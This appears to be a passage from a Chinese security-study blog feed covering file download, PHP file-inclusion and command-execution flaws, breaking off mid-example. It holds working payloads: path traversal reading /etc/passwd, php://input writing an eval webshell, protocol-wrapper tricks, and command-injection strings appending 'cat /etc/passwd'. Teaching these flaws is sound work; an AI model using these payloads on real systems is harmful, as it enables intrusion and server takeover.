二月-Zone 真题复现-比赛拓展</h4><p>通过抓包发现Cookie中login=0，我们试着修改为1</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119957.png" alt="image-20210917112702300"></p><p>登录成功后继续抓包</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119190.png" alt="image-20210917135752391"></p><p>这里发现文件下载漏洞，成功读取到passwd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..././..././..././etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211119339.png" alt="image-20210917140011563"></p><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><ul><li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li><li><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=57475">https://www.ichunqiu.com/battalion?t=1&amp;r=57475</a></li><li><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></li><li><a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件下载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>31WEB漏洞-文件操作之文件包含漏洞全解</title>
      <link href="/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h3><p>为了更好的使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。</p><h3 id="文件包含产生原因"><a href="#文件包含产生原因" class="headerlink" title="文件包含产生原因"></a>文件包含产生原因</h3><p>在包含文件时候，为了灵活包含文件，将包含文件设置为变量，通过动态变量引入需要包含的文件时，用户可以通过控制变量，而服务器端没有校验变量，从而导致文件包含漏洞，通常此漏洞出现在PHP中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">.......</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><p>include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。</p><p>include 和 require 语句是相同的，除了错误处理方面：</p><ul><li>require 会生成致命错误（E_COMPILE_ERROR）并停止脚本</li><li>include 只生成警告（E_WARNING），并且脚本会继续</li></ul><p>include_once 函数会将指定的文件载入并执行里面的程序；此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。</p><p>require_once也是一样的，当处理到错误的时候，require_once会停止脚本，include_once不会。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>文件包含代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename);</span><br><span class="line">/*</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename.&quot;.html&quot;);</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854089.png" alt="image-20210921085420989"></p><p>本来文件是txt的文本</p><p>但是通过文件包含能够执行其中的代码</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854530.png" alt="image-20210921085433419"></p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><h4 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h4><p>代码审计</p><h4 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h4><ul><li>漏扫工具</li><li>公开漏洞</li><li>手工看参数值及功能</li></ul><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>文件和网站在一个服务器上，类似像127.0.0.1/?file=../../phpinfo.php这样就属于本地文件包含</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><h5 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h5><p>因为1.txt在根目录下，而test/php和她有2级目录，所有需要../退俩次目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/123/upload/test.php?filename=../../1.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210854942.png" alt="image-20210921085443882"></p><h5 id="有限制"><a href="#有限制" class="headerlink" title="有限制"></a>有限制</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include($filename.&quot;.html&quot;);</span><br></pre></td></tr></table></figure><p>include会在filename后面添加一个.<code>html</code>。</p><p><strong>%00截断绕过</strong></p><p>利用条件</p><ul><li>magic_quotes_gpc = Off</li><li>php版本&lt;5.3.4</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852172.png" alt="image-20210914210252910"></p><p><strong>长度截断绕过</strong></p><p>利用条件</p><p>windows，点号需要长于250;linux长于4096</p><p>好像绕过不去了。。。。。。。</p><h3 id="远程文件包含-危害更大"><a href="#远程文件包含-危害更大" class="headerlink" title="远程文件包含(危害更大)"></a>远程文件包含(危害更大)</h3><p>文件和网站不在一个服务器上，类似像127.0.0.1/?file=<a href="http://www.baidu.com这样就属于远程文件包含./">www.baidu.com这样就属于远程文件包含。</a></p><h4 id="类型-1"><a href="#类型-1" class="headerlink" title="类型"></a>类型</h4><p><strong>前提条件</strong></p><ul><li>allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读取远程文件</li><li>allow_url_include:为ON时，就可以使用include和require的方式包含远程文件。</li></ul><p><strong>无限制</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852180.png" alt="image-20210914211218583"></p><p>如果远程代码时后门，我们就可以通过远程文件包含从而获取webshell。</p><p><strong>有限制</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855217.png" alt="image-20210921085504128"></p><p>通过在后面增加特殊符号来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20、%23、?</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855702.png" alt="image-20210921085513609"></p><h3 id="各种协议流的玩法"><a href="#各种协议流的玩法" class="headerlink" title="各种协议流的玩法"></a>各种协议流的玩法</h3><h3 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a>PHP伪协议总结</h3><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h4><h5 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h5><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_fopen</code>:off/on</li></ul><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><p><em>文件系统</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。   当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。   在很多情况下是脚本所在的目录，除非被修改了。   使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>，   <code>include_path</code> 会可选地搜索，也作为相对的路径。  </p><h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>1.file://[文件的绝对路径和文件名]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=file://D:\phpstudy\www\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855507.png" alt="image-20210921085524443"></p><p>2.[文件的相对路径和文件名]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=../phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852850.png" alt="image-20210321183305055"></p><p>3.[http：//网络路径和文件名]</p><p>这里进行远程访问的时候需要<code>allow_url_include=On</code>模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855978.png" alt="image-20210921085534907"></p><h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h4><ul><li><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h5><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li></ul></li><li><h5 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h5><p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><h5 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h5><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th align="left">作用</th></tr></thead><tbody><tr><td>php://input</td><td align="left">可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php://output</td><td align="left">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td align="left">(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td align="left">(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td align="left">(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></li><li><h5 id="php-filter-参数详解"><a href="#php-filter-参数详解" class="headerlink" title="php://filter  参数详解"></a>php://filter  参数详解</h5><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table></li><li><h5 id="可用的过滤器列表（4类）"><a href="#可用的过滤器列表（4类）" class="headerlink" title="可用的过滤器列表（4类）"></a>可用的过滤器列表（4类）</h5><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table></li><li><p><strong>示例</strong>：</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure></li><li><p><code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>若有写入权限，写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php">https://php.net/manual/zh/wrappers.php.php</a></p></li></ul><h4 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h4><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。  </p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure></li><li><p><code>compress.bzip2://file.bz2</code></p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure></li><li><p><code>compress.zlib://file.gz</code></p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php">http://php.net/manual/zh/wrappers.compression.php</a></p></li></ul><h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><ol><li><p><code>data://text/plain,</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>data://text/plain;base64,</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https://协议"></a>http:// &amp; https://协议</h4><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h4><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><ul><li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li><li><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=57475">https://www.ichunqiu.com/battalion?t=1&amp;r=57475</a></li><li><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></li><li><a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30WEB漏洞-RCE代码及命令执行漏洞全解</title>
      <link href="/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。</p><h3 id="代码执行-RCE-漏洞"><a href="#代码执行-RCE-漏洞" class="headerlink" title="代码执行 RCE 漏洞"></a>代码执行 RCE 漏洞</h3><h4 id="形成"><a href="#形成" class="headerlink" title="形成"></a>形成</h4><ul><li>可控变量</li><li>漏洞函数</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>会将我们输入的数据当做代码来执行，如果我们当前的网站是PHP就当做PHP语言来执行。</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p><strong>白盒</strong></p><ul><li>代码审计</li></ul><p><strong>黑盒</strong></p><ul><li>漏扫工具</li><li>公开漏洞</li><li>手工看参数值及功能点</li></ul><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure><p>将输入的字符串当做PHP代码执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert()</span><br></pre></td></tr></table></figure><p>会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br></pre></td></tr></table></figure><p>把第一参数作为回调函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array()</span><br></pre></td></tr></table></figure><p>调用回到函数,并把第一个数组参数作为回到函数的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map()</span><br></pre></td></tr></table></figure><p>为数组的每个元素应用回调函数</p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul><li>敏感函数禁用</li><li>变量过滤或固定</li><li>WAF产品</li></ul><h4 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h4><p>这题是一个白盒测试，需要代码审计</p><p><img src="https://p.pstatp.com/origin/pgc-image/0c00ea242aa74405bb4f687222e06941"></p><p>该代码是将一个字符串进行解密，然后执行脚本命令</p><p><img src="https://p.pstatp.com/origin/pgc-image/0611a988ad1d4e4daabfbf11a4064d65"></p><p>解密后发现是接收一个a参数</p><p>直接使用<code>?a=ls</code>执行命令</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><ul><li>linux</li><li>windows</li></ul><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。</p><h4 id="形成-1"><a href="#形成-1" class="headerlink" title="形成"></a>形成</h4><ul><li>可控变量</li><li>漏洞函数</li></ul><h4 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h4><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">A;B A 不论正确与否都会执行 B</span><br><span class="line">A&amp;B A 后台运行，A 和 B 同时执行</span><br><span class="line">A&amp;&amp;B A 执行成功时候才会执行 B 命令</span><br><span class="line">A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</span><br><span class="line">A||B A 执行失败后才会执行 B 命令</span><br><span class="line">``    反单引号linux下会当做命令来执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">127.0.0.1 ; cat /etc/passwd </span><br><span class="line">127.0.0.1 &amp; cat /etc/passwd </span><br><span class="line">127.0.0.1 &amp;&amp; cat /etc/passwd </span><br><span class="line">127.0.0.1 | cat /etc/passwd </span><br><span class="line">233 || cat /etc/passwd</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;|&quot;: 直接执行后面的语句。</span><br><span class="line">&quot;||&quot;: 如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</span><br><span 